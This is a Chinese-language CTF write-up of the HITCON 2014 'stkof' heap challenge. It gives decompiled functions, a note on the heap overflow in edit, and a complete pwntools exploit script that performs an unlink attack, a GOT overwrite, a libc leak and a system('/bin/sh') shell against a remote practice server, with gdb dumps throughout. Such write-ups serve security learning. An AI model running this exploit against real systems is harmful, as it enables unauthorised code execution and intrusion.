---
layout: post
title:  stkof(hitcon2014)
date:   2022-09-19 00:08:01 +0300
image:  2022-09-19-hydrangeas.jpg
tags:   [ctf,pwn,ubuntu16,unlink,UAF,heap,hitcon]
---

main

```assembly
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int v3; // eax
  unsigned int v5; // [rsp+Ch] [rbp-74h]
  char nptr[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v7; // [rsp+78h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  while ( fgets(nptr, 0xA, stdin) )
  {
    v3 = atoi(nptr);
    if ( v3 == 2 )
    {
      v5 = edit();
      goto LABEL_14;
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        v5 = delete();
        goto LABEL_14;
      }
      if ( v3 == 4 )
      {
        v5 = sub_400BA9();
        goto LABEL_14;
      }
    }
    else if ( v3 == 1 )
    {
      v5 = add();
      goto LABEL_14;
    }
    v5 = 0xFFFFFFFF;
LABEL_14:
    if ( v5 )
      puts("FAIL");
    else
      puts("OK");
    fflush(stdout);
  }
  return 0LL;
}
```

add

```assembly
__int64 add()
{
  __int64 size; // [rsp+0h] [rbp-80h]
  char *v2; // [rsp+8h] [rbp-78h]
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v4; // [rsp+78h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  fgets(s, 0x10, stdin);
  size = atoll(s);
  v2 = (char *)malloc(size);
  if ( !v2 )
    return 0xFFFFFFFFLL;
  (&::s)[++dword_602100] = v2;
  printf("%d\n", (unsigned int)dword_602100);
  return 0LL;
}
```

++dword_602100所以序号是从1开始

这里用size分配了chunk，但是并没有记录这个大小

edit

```assembly
__int64 edit()
{
  __int64 result; // rax
  int i; // eax
  unsigned int index; // [rsp+8h] [rbp-88h]
  __int64 n; // [rsp+10h] [rbp-80h]
  char *ptr; // [rsp+18h] [rbp-78h]
  char s[104]; // [rsp+20h] [rbp-70h] BYREF
  unsigned __int64 v6; // [rsp+88h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  fgets(s, 0x10, stdin);
  index = atol(s);
  if ( index > 0x100000 )
    return 0xFFFFFFFFLL;
  if ( !(&::s)[index] )
    return 0xFFFFFFFFLL;
  fgets(s, 0x10, stdin);
  n = atoll(s);
  ptr = (&::s)[index];
  for ( i = fread(ptr, 1uLL, n, stdin); i > 0; i = fread(ptr, 1uLL, n, stdin) )
  {
    ptr += i;
    n -= i;
  }
  if ( n )
    result = 0xFFFFFFFFLL;
  else
    result = 0LL;
  return result;
}
```

修改内容时，可以重新给定大小size，读入内容content，这里为漏洞

delete

```assembly
__int64 delete()
{
  unsigned int v1; // [rsp+Ch] [rbp-74h]
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  fgets(s, 0x10, stdin);
  v1 = atol(s);
  if ( v1 > 0x100000 )
    return 0xFFFFFFFFLL;
  if ( !(&::s)[v1] )
    return 0xFFFFFFFFLL;
  free((&::s)[v1]);
  (&::s)[v1] = 0LL;
  return 0LL;
}
```

bss段上，0x602100存储了note数量，0x602140存储了指针数组，索引从1开始

exp

```assembly
#-*-coding:utf-8-*-
from pwn import *
from LibcSearcher import *

io = remote("node4.buuoj.cn", 25858)
# io = process("./stkof")

def add(size):
    io.sendline("1")
    io.sendline(str(size))
    io.recvuntil("OK\n")
 
def edit(idx, strings):
    io.sendline("2")
    io.sendline(str(idx))
    io.sendline(str(len(strings)))
    io.send(strings)
    io.recvuntil("OK\n")

def free(idx):
    io.sendline("3")
    io.sendline(str(idx))
    # io.recvuntil("OK")
 

add(0x20)
add(0x30)
add(0x80)
add(0x20)

'''
gdb-peda$ x/20xg 0x602100
0x602100:	0x0000000000000004	0x0000000000000000
0x602110:	0x0000000000000000	0x0000000000000000
0x602120:	0x0000000000000000	0x0000000000000000
0x602130:	0x0000000000000000	0x0000000000000000
0x602140:	0x0000000000000000	0x00000000019e6020
0x602150:	0x00000000019e6460	0x00000000019e64a0
0x602160:	0x00000000019e6530	0x0000000000000000
'''

'''
gdb-peda$ x/200gx 0x00000000019e6010
0x19e6010:	0x0000000000000000	0x0000000000000031 1
0x19e6020:	0x0000000000000000	0x0000000000000000
0x19e6030:	0x0000000000000000	0x0000000000000000
0x19e6040:	0x0000000000000000	0x0000000000000411
0x19e6050:	0x00000000000a4b4f	0x0000000000000000
0x19e6060:	0x0000000000000000	0x0000000000000000
0x19e6070:	0x0000000000000000	0x0000000000000000
0x19e6080:	0x0000000000000000	0x0000000000000000
0x19e6090:	0x0000000000000000	0x0000000000000000
0x19e60a0:	0x0000000000000000	0x0000000000000000
0x19e60b0:	0x0000000000000000	0x0000000000000000
0x19e60c0:	0x0000000000000000	0x0000000000000000
0x19e60d0:	0x0000000000000000	0x0000000000000000
0x19e60e0:	0x0000000000000000	0x0000000000000000
0x19e60f0:	0x0000000000000000	0x0000000000000000
0x19e6100:	0x0000000000000000	0x0000000000000000
0x19e6110:	0x0000000000000000	0x0000000000000000
0x19e6120:	0x0000000000000000	0x0000000000000000
0x19e6130:	0x0000000000000000	0x0000000000000000
0x19e6140:	0x0000000000000000	0x0000000000000000
0x19e6150:	0x0000000000000000	0x0000000000000000
0x19e6160:	0x0000000000000000	0x0000000000000000
0x19e6170:	0x0000000000000000	0x0000000000000000
0x19e6180:	0x0000000000000000	0x0000000000000000
0x19e6190:	0x0000000000000000	0x0000000000000000
0x19e61a0:	0x0000000000000000	0x0000000000000000
0x19e61b0:	0x0000000000000000	0x0000000000000000
0x19e61c0:	0x0000000000000000	0x0000000000000000
0x19e61d0:	0x0000000000000000	0x0000000000000000
0x19e61e0:	0x0000000000000000	0x0000000000000000
0x19e61f0:	0x0000000000000000	0x0000000000000000
0x19e6200:	0x0000000000000000	0x0000000000000000
0x19e6210:	0x0000000000000000	0x0000000000000000
0x19e6220:	0x0000000000000000	0x0000000000000000
0x19e6230:	0x0000000000000000	0x0000000000000000
0x19e6240:	0x0000000000000000	0x0000000000000000
0x19e6250:	0x0000000000000000	0x0000000000000000
0x19e6260:	0x0000000000000000	0x0000000000000000
0x19e6270:	0x0000000000000000	0x0000000000000000
0x19e6280:	0x0000000000000000	0x0000000000000000
0x19e6290:	0x0000000000000000	0x0000000000000000
0x19e62a0:	0x0000000000000000	0x0000000000000000
0x19e62b0:	0x0000000000000000	0x0000000000000000
0x19e62c0:	0x0000000000000000	0x0000000000000000
0x19e62d0:	0x0000000000000000	0x0000000000000000
0x19e62e0:	0x0000000000000000	0x0000000000000000
0x19e62f0:	0x0000000000000000	0x0000000000000000
0x19e6300:	0x0000000000000000	0x0000000000000000
0x19e6310:	0x0000000000000000	0x0000000000000000
0x19e6320:	0x0000000000000000	0x0000000000000000
0x19e6330:	0x0000000000000000	0x0000000000000000
0x19e6340:	0x0000000000000000	0x0000000000000000
0x19e6350:	0x0000000000000000	0x0000000000000000
0x19e6360:	0x0000000000000000	0x0000000000000000
0x19e6370:	0x0000000000000000	0x0000000000000000
0x19e6380:	0x0000000000000000	0x0000000000000000
0x19e6390:	0x0000000000000000	0x0000000000000000
0x19e63a0:	0x0000000000000000	0x0000000000000000
0x19e63b0:	0x0000000000000000	0x0000000000000000
0x19e63c0:	0x0000000000000000	0x0000000000000000
0x19e63d0:	0x0000000000000000	0x0000000000000000
0x19e63e0:	0x0000000000000000	0x0000000000000000
0x19e63f0:	0x0000000000000000	0x0000000000000000
0x19e6400:	0x0000000000000000	0x0000000000000000
0x19e6410:	0x0000000000000000	0x0000000000000000
0x19e6420:	0x0000000000000000	0x0000000000000000
0x19e6430:	0x0000000000000000	0x0000000000000000
0x19e6440:	0x0000000000000000	0x0000000000000000
0x19e6450:	0x0000000000000000	0x0000000000000041 2
0x19e6460:	0x0000000000000000	0x0000000000000000
0x19e6470:	0x0000000000000000	0x0000000000000000
0x19e6480:	0x0000000000000000	0x0000000000000000
0x19e6490:	0x0000000000000000	0x0000000000000091 3
0x19e64a0:	0x0000000000000000	0x0000000000000000
0x19e64b0:	0x0000000000000000	0x0000000000000000
0x19e64c0:	0x0000000000000000	0x0000000000000000
0x19e64d0:	0x0000000000000000	0x0000000000000000
0x19e64e0:	0x0000000000000000	0x0000000000000000
0x19e64f0:	0x0000000000000000	0x0000000000000000
0x19e6500:	0x0000000000000000	0x0000000000000000
0x19e6510:	0x0000000000000000	0x0000000000000000
0x19e6520:	0x0000000000000000	0x0000000000000031 4
0x19e6530:	0x0000000000000000	0x0000000000000000
0x19e6540:	0x0000000000000000	0x0000000000000000
0x19e6550:	0x0000000000000000	0x0000000000020ab1
'''

target = 0x602140 + 0x10   # 2
fd = target - 0x18
bk = target - 0x10

payload = p64(0) + p64(0x30)
payload += p64(fd) + p64(bk)
payload += "a"*0x10    # 到这里是伪chunk的信息
payload += p64(0x30) + p64(0x90) # 这里是覆盖内存块3的前两个内存单元
edit(2, payload)

'''
gdb-peda$ x/100gx 0x00000000015a8450
0x15a8450:	0x0000000000000000	0x0000000000000041 2
0x15a8460:	0x0000000000000000	0x0000000000000030
0x15a8470:	0x0000000000602138	0x0000000000602140
0x15a8480:	0x6161616161616161	0x6161616161616161
0x15a8490:	0x0000000000000030	0x0000000000000090 3  为free内存3时可以向前合并内存块2做准备
0x15a84a0:	0x0000000000000000	0x0000000000000000
0x15a84b0:	0x0000000000000000	0x0000000000000000
0x15a84c0:	0x0000000000000000	0x0000000000000000
0x15a84d0:	0x0000000000000000	0x0000000000000000
0x15a84e0:	0x0000000000000000	0x0000000000000000
0x15a84f0:	0x0000000000000000	0x0000000000000000
0x15a8500:	0x0000000000000000	0x0000000000000000
0x15a8510:	0x0000000000000000	0x0000000000000000
0x15a8520:	0x0000000000000000	0x0000000000000031 4
0x15a8530:	0x0000000000000000	0x0000000000000000
0x15a8540:	0x0000000000000000	0x0000000000000000
0x15a8550:	0x0000000000000000	0x0000000000020ab1
'''

free(3)
io.recv()
'''
gdb-peda$ x/10gx 0x602140
0x602140:	0x0000000000000000	0x00000000029c2020
0x602150:	0x0000000000602138	0x0000000000000000
0x602160:	0x00000000029c2530	0x0000000000000000
可以看到global[2]的值被改成global[0]-0x8
即已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18
'''
'''
gdb-peda$ x/100gx 0x00000000029c2450
0x29c2450:	0x0000000000000000	0x0000000000000041 2
0x29c2460:	0x0000000000000000	0x00000000000000c1 unsortedbin
0x29c2470:	0x00007fa2a117fb78	0x00007fa2a117fb78
0x29c2480:	0x6161616161616161	0x6161616161616161
0x29c2490:	0x0000000000000030	0x0000000000000090 3
0x29c24a0:	0x0000000000000000	0x0000000000000000
0x29c24b0:	0x0000000000000000	0x0000000000000000
0x29c24c0:	0x0000000000000000	0x0000000000000000
0x29c24d0:	0x0000000000000000	0x0000000000000000
0x29c24e0:	0x0000000000000000	0x0000000000000000
0x29c24f0:	0x0000000000000000	0x0000000000000000
0x29c2500:	0x0000000000000000	0x0000000000000000
0x29c2510:	0x0000000000000000	0x0000000000000000
0x29c2520:	0x00000000000000c0	0x0000000000000030
0x29c2530:	0x0000000000000000	0x0000000000000000
0x29c2540:	0x0000000000000000	0x0000000000000000
0x29c2550:	0x0000000000000000	0x0000000000020ab1
'''
'''
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x29c2550 (size : 0x20ab0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x29c2460 (size : 0xc0)
'''

free_got = 0x602018
puts_got = 0x602020
puts_plt = 0x400760
payload2 = "a"*0x10     # 填充global[]-8,global[0]。
payload2 += p64(free_got) + p64(puts_got)    # 覆盖global[1],global[2]为free_got,puts_got
edit(2, payload2)
'''
gdb-peda$ x/20gx 0x602100
0x602100:	0x0000000000000004	0x0000000000000000
0x602110:	0x0000000000000000	0x0000000000000000
0x602120:	0x0000000000000000	0x0000000000000000
0x602130:	0x0000000000000000	0x6161616161616161
0x602140:	0x6161616161616161	0x0000000000602018 1
0x602150:	0x0000000000602020	0x0000000000000000
0x602160:	0x0000000001926530	0x0000000000000000
'''

# 将puts_plt覆盖到free_got中去，那么free内存块2的时候，就可以将puts的实际地址泄露
payload3 = p64(puts_plt)
edit(1, payload3)
'''
gdb-peda$ x/20gx 0x602100
0x602100:	0x0000000000000004	0x0000000000000000
0x602110:	0x0000000000000000	0x0000000000000000
0x602120:	0x0000000000000000	0x0000000000000000
0x602130:	0x0000000000000000	0x6161616161616161
0x602140:	0x6161616161616161	0x0000000000602018
0x602150:	0x0000000000602020	0x0000000000000000
0x602160:	0x000000000274e530	0x0000000000000000
0x602170:	0x0000000000000000	0x0000000000000000
0x602180:	0x0000000000000000	0x0000000000000000
0x602190:	0x0000000000000000	0x0000000000000000
gdb-peda$ x/10gx 0x0000000000602018
0x602018 <free@got.plt>:	0x0000000000400760	0x00007ff4083a86a0
'''

free(2)

addr = u64(io.recvuntil("\n")[:-1].ljust(8, "\x00"))
print(hex(addr))
# io.recv()


libc = LibcSearcher("puts", addr)
base = addr - libc.dump("puts")
system = base + libc.dump("system")

payload3 = p64(system)
edit(1, payload3)

add(0x10)
edit(5, "/bin/sh\x00")

free(5)

# gdb.attach(io)
# raw_input()

# flag{57efedd3-9583-40a3-8d32-0c83a01e7ea1}

io.interactive()
```

